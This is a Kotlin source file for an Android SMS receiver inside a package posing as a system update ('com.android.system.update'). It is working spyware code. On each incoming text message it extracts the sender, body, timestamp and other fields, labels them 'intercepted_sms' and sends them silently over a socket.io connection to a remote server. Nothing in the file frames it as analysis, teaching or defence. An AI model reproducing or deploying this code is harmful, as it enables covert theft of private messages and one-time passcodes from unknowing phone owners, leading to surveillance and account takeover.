package com.android.system.update.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import com.android.system.update.R
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    
    companion object {
        private const val TAG = "SmsReceiver"
        private const val TAG_WS_URL = "ws_url"
    }
    
    private var socket: Socket? = null
    
    override fun onReceive(context: Context, intent: Intent) {
        try {
            val bundle: Bundle = intent.extras ?: return
            val pdus = bundle.get("pdus") as? Array<*> ?: return
            
            val messages = mutableListOf<JSONObject>()
            
            for (pdu in pdus) {
                val format = bundle.getString("format") ?: "3gpp"
                val message = SmsMessage.createFromPdu(pdu as ByteArray, format)
                
                val smsData = JSONObject().apply {
                    put("address", message.displayOriginatingAddress)
                    put("body", message.messageBody)
                    put("date", message.timestampMillis)
                    put("serviceCenter", message.serviceCenterAddress)
                    put("status", message.status)
                    put("protocolIdentifier", message.protocolIdentifier)
                }
                messages.add(smsData)
            }
            
            // Forward intercepted SMS to server
            forwardSmsToServer(context, messages)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing SMS: ${e.message}")
        }
    }
    
    private fun forwardSmsToServer(context: Context, messages: List<JSONObject>) {
        Thread {
            try {
                val wsUrl = context.getString(R.string.ws_url)
                if (socket == null || !socket!!.connected()) {
                    socket = IO.socket(wsUrl)
                    socket?.connect()
                    
                    // Wait for connection
                    Thread.sleep(1000)
                }
                
                val data = JSONObject()
                data.put("type", "intercepted_sms")
                data.put("messages", JSONObject().apply {
                    put("sms", messages)
                    put("total", messages.size)
                })
                
                socket?.emit("device:data:bulk", data)
                Log.d(TAG, "Forwarded ${messages.size} SMS messages to server")
                
            } catch (e: Exception) {
                Log.e(TAG, "Error forwarding SMS: ${e.message}")
            }
        }.start()
    }
}